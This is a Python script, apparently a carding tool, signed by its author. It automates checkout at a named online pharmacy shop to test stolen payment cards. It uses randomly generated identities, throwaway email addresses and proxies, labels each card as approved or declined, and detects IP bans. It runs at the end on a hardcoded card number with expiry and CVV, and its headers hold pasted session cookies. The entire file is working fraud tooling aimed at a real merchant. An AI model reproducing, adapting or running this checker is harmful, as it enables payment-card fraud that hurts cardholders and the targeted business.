import requests
import time
import names
import random
from urllib.parse import quote

#----[LIBREARIAS NECESARIAS PARA EJECUTAR EL SCRIPT|CODIGO]-----#
# 1-names
# 2-requests

estados_dict = {
    "ALABAMA": "AL",
    "ALASKA": "AK",
    "ARIZONA": "AZ",
    "ARKANSAS": "AR",
    "CALIFORNIA": "CA",
    "CAROLINA DEL NORTE": "NC",
    "CAROLINA DEL SUR": "SC",
    "COLORADO": "CO",
    "CONNECTICUT": "CT",
    "DAKOTA DEL NORTE": "ND",
    "DAKOTA DEL SUR": "SD",
    "DELAWARE": "DE",
    "FLORIDA": "FL",
    "GEORGIA": "GA",
    "HAWÁI": "HI",
    "IDAHO": "ID",
    "ILLINOIS": "IL",
    "INDIANA": "IN",
    "IOWA": "IA",
    "KANSAS": "KS",
    "KENTUCKY": "KY",
    "LUISIANA": "LA",
    "MAINE": "ME",
    "MARYLAND": "MD",
    "MASSACHUSETTS": "MA",
    "MICHIGAN": "MI",
    "MINNESOTA": "MN",
    "MISSISSIPPI": "MS",
    "MISURI": "MO",
    "MONTANA": "MT",
    "NEBRASKA": "NE",
    "NEVADA": "NV",
    "NUEVA HAMPSHIRE": "NH",
    "NUEVA JERSEY": "NJ",
    "NUEVO MÉXICO":  "NM", 
     "NUEVA YORK":"NY", 
     "OHIO":"OH", 
     "OKLAHOMA":"OK", 
     "OREGÓN":"OR", 
     "PENSILVANIA":"PA", 
     "RHODE ISLAND":"RI", 
     "TENNESSEE":"TN", 
     "TEXAS":"TX", 
     "UTAH":"UT", 
     "VERMONT":"VT", 
     "VIRGINIA":"VA", 
     "VIRGINIA OCCIDENTAL":"WV", 
     "WISCONSIN":"WI", 
     "WYOMING":"WY",
     "PENNSYLVANIA":"PA",
     "SOUTH CAROLINA": "SC",
     "NEW HAMPSHIRE": "NH",
     "MISSOURI": "MO",
     "OREGON": "OR",
     "SOUTH DAKOTA": "SD",
     "NORTH CAROLINA": "NC",
     "NEW MEXICO": "NM",
     "WASHINGTON": "WA",
     "HAWAII": "HI",
     "WEST VIRGINIA": "WV",
     "LOUISIANA": "LA",
     "NORTH DAKOTA":"ND",
     "NEW JERSEY":"NJ",
     "NEW YORK":"NY"
}
def abreviar_estado(estado):
    """Devuelve la abreviatura del estado dado en mayúsculas."""
    
    # Convertir el estado a mayúsculas para la búsqueda
    estado_mayus = estado.upper()
    
    # Buscar la abreviatura en el diccionario
    return estados_dict.get(estado_mayus, f"No se encontró la abreviatura para '{estado}'.")

print("</>By => @tanjiro_fuego")
def idk(tarjeta):
    #-------[CREANDO SESSION]----#
    api = requests.get(f"https://randomuser.me/api/?nat=us&inc=name,location,phone&exc=location.city").json()
    nombre = api["results"][0]["name"]["first"]
    last = api["results"][0]["name"]["last"]
    loca = api["results"][0]["location"]["street"]["name"]
    nm = api["results"][0]["location"]["street"]["number"]
    city = api["results"][0]["location"]["city"]
    state = api["results"][0]["location"]["state"]
    country = api["results"][0]["location"]["country"]
    postcode = api["results"][0]["location"]["postcode"]
    phone = api["results"][0]["phone"]
    phone = phone.replace(" ","+")
    state = state.replace(" ","+")
    provincia = abreviar_estado(state)
    tarjeta = tarjeta.strip()
    separador = tarjeta.split("|")
    cc = separador[0]
    mes = separador[1]
    año = separador[2]
    if len(año) == 4:
        año = año[2:]
    cvv = separador[3]
    parte1 = cc[:4]   # Primeros 4 dígitos
    parte2 = cc[4:8]  # Siguientes 4 dígitos
    parte3 = cc[8:12] # Siguientes 4 dígitos
    parte4 = cc[12:]
    correo = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com" 
    correo_modificado = quote(correo)

    session = requests.Session()
    
    #Poniendo proxies ala sesion
    session.proxies = {
        'http': 'http://your_proxy_ip:port',  # Reemplaza por tu proxie htpp usa si tienes
        'https': 'https://your_proxy_ip:port'  # Reemplaza por tu proxie htpps usa si tienes
    }

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'priority': 'u=0, i',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    params = {
        's1_option': 'option_1',
    }

    rq1 = session.get('https://secure3.navamd.com/otc-shop/checkout/', params=params, headers=headers)
    time.sleep(2)
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; dicbo_id=%7B%22dicbo_fetch%22%3A1737492689026%7D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    data = data = f'firstName={nombre}&state={provincia}&country=US&lastName={last}&address1={loca}+{nm}&address2=&city={state}&zip={postcode}&email={correo_modificado}&telephone={phone}'

    rq2 = session.post('https://secure3.navamd.com/api/processData/',  headers=headers, data=data).json()
    time.sleep(2)
    
    headers = {
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; dicbo_id=%7B%22dicbo_fetch%22%3A1737492689026%7D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}
    phone = phone.replace(" ","%")
    state = state.replace(" ","%")
    data = f'firstName={nombre}&lastName={last}&address1={loca}%{nm}&address2=&city={state}&country=US&state={provincia}&zip={postcode}&telephone={phone}&email={correo_modificado}&billing-S-A-Shipping=yes&billingFirstName=&billingLastName=&billingAddress1=&billingAddress2=&billingCity=&billingCountry=US&billingZipCode=&billingTelephone=&creditCardOption=true&creditCardType=visa&ccNumber=&cvv=&rgnlctn=2'

    rq3 = session.post('https://secure3.navamd.com/api/cot/',  headers=headers, data=data).json()
    time.sleep(2)
    
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    phone = phone.replace(" ","+")
    state = state.replace(" ","+")
    data = f'firstName={nombre}&state={provincia}&country=US&lastName={last}&address1={loca}+{nm}&address2=&city={state}&zip={postcode}&email={correo_modificado}&telephone={phone}&ccNumber={parte1}+-+{parte2}+-+{parte3}+-+{parte3}&expMonth={mes}&expYear={año}&cvv={cvv}'
    rq4 = session.post('https://secure3.navamd.com/api/processData/', headers=headers, data=data).json()
    time.sleep(3)
    
    headers = {
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; dicbo_id=%7B%22dicbo_fetch%22%3A1737492689026%7D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    data = {
        'event': 'add_payment_info',
        'step': '1',
    }

    rq5 = session.post('https://secure3.navamd.com/api/getDataLayerValues/',headers=headers, data=data).json()
        
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; dicbo_id=%7B%22dicbo_fetch%22%3A1737492689026%7D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    data = f'firstName={nombre}&state={provincia}&country=US&lastName={last}&address1={loca}+{nm}&address2=&city={state}&zip={postcode}&email={correo_modificado}&telephone={phone}&ccNumber='

    rq = session.post('https://secure3.navamd.com/api/processData/', headers=headers, data=data).json()
            

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'PHPSESSID=v33obbupldi25vhpprvu0ou0h3; /otc-shop/=v33obbupldi25vhpprvu0ou0h3; _gcl_au=1.1.1696672302.1737492685; _ga=GA1.1.1523735903.1737492685; _li_dcdm_c=.navamd.com; _lc2_fpi=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; _lc2_fpi_js=1973f6c6a5f7--01jj5a4t5jt1fa330f4mmq8p9w; __attentive_session_id=2a79ea3b79684a58be6783f53d7afc15; __attentive_id=83ed557870054ff3b0dd576b0fcf8cf7; _attn_=eyJ1Ijoie1wiY29cIjoxNzM3NDkyNjg3MTM3LFwidW9cIjoxNzM3NDkyNjg3MTM3LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjgzZWQ1NTc4NzAwNTRmZjNiMGRkNTc2YjBmY2Y4Y2Y3XCJ9In0=; __attentive_cco=1737492687174; _fbp=fb.1.1737492687211.486834626532338636; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; _tt_enable_cookie=1; _ttp=Owxbh_Qd2abKy299bE5GKcFRAs2.tt.1; _scid=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _scid_r=bxTdGp9pKXpJQw2a6TWIH18pmZYmSdZg; _pin_unauth=dWlkPU5qTmlOelkwWkdVdE9HRTNOQzAwTVRRM0xUazFObVl0TlRFMk5tSTRORFF4TVRVMA; __attentive_dv=1; _ScCbts=%5B%5D; _ga_2C84R5T300=GS1.1.1737492685.1.0.1737492724.21.0.0; attntv_mstore_email=david@gmail.com:0; _derived_epik=dj0yJnU9ckVnN2NqY2xfMy01MHVYajUyRWVyTlYzdHpqVjliYWQmbj1GSnFESFc2RlkwZ2t2YmxnOVpmTTFnJm09MTAmdD1BQUFBQUdlUUNUSSZybT0xMCZydD1BQUFBQUdlUUNUSSZzcD0x; attntv_mstore_phone=5734564554:0',
    'origin': 'https://secure3.navamd.com',
    'priority': 'u=1, i',
    'referer': 'https://secure3.navamd.com/otc-shop/checkout/?s1_option=option_1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
}

    data = f'firstName={nombre}&lastName={last}&address1={loca}+{loca}&address2=&city={state}&country=US&state=NY&zip={postcode}&telephone={phone}&email={correo_modificado}&billing-S-A-Shipping=yes&billingFirstName=&billingLastName=&billingAddress1=&billingAddress2=&billingCity=&billingCountry=US&billingZipCode=&billingTelephone=&creditCardOption=true&creditCardType=master&ccNumber={parte1}+-+{parte2}+-+{parte3}+-+{parte4}&expMonth={mes}&expYear={año}&cvv={cvv}&termsbox=true&rgnlctn=2&eci=00&cavv=&xid=3620556a-ff3d-40e5-8666-5223a096b42c&status=R&protocolVersion=2.2.0&authenticationValue=undefined&dsTransactionId=629df305-405b-4256-b80d-860efea6f52e'

    try:
        rq6 = session.post('https://secure3.navamd.com/api/pac/', headers=headers, data=data).json()
        session.close()
    except:
        return print("ban de ip"+"ban de ip")
    
    if 'error_message' in rq6:
        msg = rq6['error_message']
        if 'CVV2' in msg:
            msg = "CVV2/VAK"
            response = "APPROVED CCN✅"
        elif 'Credit Floor' in msg:
            msg = "Credit Floor"
            response = "APPROVED ✅"
        else:
            response = "DECLINED ❌"
            
        #------[RETORNANDO RESPUESTA]------#
        return msg,response,cc
    elif 'error_message' not in rq6:
        msg = "Thank you!"
        response = "APPROVED ✅"
        return msg,response,cc
        
    
    

try: 
    msg,response,cc = idk("5178058593262986|11|25|058")
    print(f"</>CC: {cc}\n</>STATUS: {response}\n</>RESPONSE:{msg}")
except Exception as e:
    print("</>cc o ip baneada")

